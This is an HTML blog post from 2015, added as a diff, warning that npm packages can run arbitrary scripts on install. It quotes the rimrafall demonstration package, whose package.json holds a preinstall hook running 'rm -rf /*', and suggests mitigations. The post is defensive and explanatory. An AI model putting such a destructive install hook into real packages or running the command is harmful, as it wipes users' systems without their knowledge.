@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width">
+    <meta name="google-site-verification" content="iplyfI0Y6pOe8NsNYwwrKe-QfSYamSeEhQiDFh93NiU">
+    <title>npm install - could be dangerous - chris-rock
+    </title>
+    <link rel="alternate" href="http://lollyrock.com/feed.xml" type="application/rss+xml" title="fun &amp; sun">
+    <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic|Anonymous+Pro:400,700,400italic,700italic|Merriweather:400,700,300">
+    <link rel="stylesheet" href="/css/main.css">
+    <script type="text/javascript">
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+      ga('create', 'UA-50992958-1', 'lollyrock.com');
+      ga('send', 'pageview');
+    </script>
+    <script type="text/javascript">
+      !function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');
+      
+    </script>
+  </head>
+  <body class="article-detail">
+    <header class="header">
+      <div class="content-wrap">
+        <h1>npm install - could be dangerous</h1>
+        <p class="author">Written by <span class="author"><a href="mailto:chris@lollyrock.com">Christoph Hartmann</a></span>
+        </p>
+      </div>
+    </header>
+    <div id="content">
+      <div class="content-wrap">
+        <article class="article">
+          <section class="content"><p><a href="https://www.npmjs.com/"><span class="caps">NPM</span></a> hosts about 144,000 npm modules on their registry. Over one million modules are downloaded per month. Assume you use one module that includes a major flaw in their implementation? Will you detect&nbsp;it?</p>
+<h2 id="what-is-going-on-">What is going&nbsp;on?</h2>
+<p>Just recently, <a href="https://github.com/joaojeronimo">João Jerónimo</a> published a special npm modules called <a href="https://github.com/joaojeronimo/rimrafall">rimrafall</a>. He published it at npm and posted it on <a href="https://news.ycombinator.com/item?id=8947493">Hacker News</a>. Essentially this module does the&nbsp;following:</p>
+<pre><code>sudo su -
+rm -rf /
+</code></pre><p>It uses a special script tag in <code>package.json</code> to run a prescript. Commonly it is used to build native code, but still can be used to do anything that bash&nbsp;can.</p>
+<p>The package.json looks as&nbsp;follows:</p>
+<pre><code>{
+  &quot;name&quot;: &quot;rimrafall&quot;,
+  &quot;version&quot;: &quot;1.0.0&quot;,
+  &quot;description&quot;: &quot;rm -rf /* # DO NOT INSTALL THIS&quot;,
+  &quot;main&quot;: &quot;index.js&quot;,
+  &quot;scripts&quot;: {
+    &quot;preinstall&quot;: &quot;rm -rf /*&quot;
+  },
+  &quot;keywords&quot;: [
+    &quot;rimraf&quot;,
+    &quot;rmrf&quot;
+  ],
+  &quot;author&quot;: &quot;João Jerónimo&quot;,
+  &quot;license&quot;: &quot;ISC&quot;
+}
+</code></pre><h2 id="risk">Risk</h2>
+<p>Once you just install this module, your computer is shredded. Do you verify all your dependencies for malicious scripts? In most cases you do not. This is especially dangerous if this runs on your production server or <span class="caps">CI</span>&nbsp;server.</p>
+<p>Although there is no easy mitigation, you could start building all your node code in a Docker container or use <code>npm install --ignore-scripts</code>. If you integrate 3<span class="ord">rd</span>-party modules, have a look at their source code, especially if it is a new&nbsp;module.</p>
+<p>See&nbsp;also:</p>
+<ul>
+<li><a href="http://lollyrock.com/articles/nodejs-encryption/">Encrypt and decrypt content with&nbsp;Nodejs</a></li>
+<li><a href="http://lollyrock.com/articles/nodejs-sha512/"><span class="caps">SHA</span> 512 Hashs with&nbsp;nodejs</a></li>
+<li><a href="http://lollyrock.com/articles/express4-file-upload/">Simple file uploads with Express&nbsp;4</a></li>
+<li><a href="http://lollyrock.com/articles/content-security-policy/">Applied Content Security Policy for Nginx and&nbsp;Nodejs</a></li>
+<li><a href="http://arlimus.github.io/articles/ready.for.es6/">Ready for&nbsp;<span class="caps">ES6</span>?</a></li>
+</ul>
+</section>
+        </article>
+      </div>
+    </div>
+    <footer>
+      <div class="content-wrap">
+        <div class="social center">
+          <div class="network"><a href="javascript:window.location=%22http://news.ycombinator.com/submitlink?u=%22+encodeURIComponent(document.location)+%22&amp;amp;t=%22+encodeURIComponent(document.title)" class="hn-link">Discuss on Hacker News</a></div>
+          <div class="network twitter"><a https://twitter.com/share data-via="chri_hartmann" data-count="none" class="twitter-share-button">Tweet</a></div>
+        </div>
+        <div class="nav"><a href="/">« Full blog</a></div>
+        <section class="about">
+        </section>
+        <section class="copy">
+          <p>&copy; 2015 Christoph Hartmann &mdash; powered by&nbsp;<a href="https://github.com/jnordberg/wintersmith">Wintersmith</a>
+          </p>
+        </section>
+      </div>
+    </footer>
+  </body>
+</html>
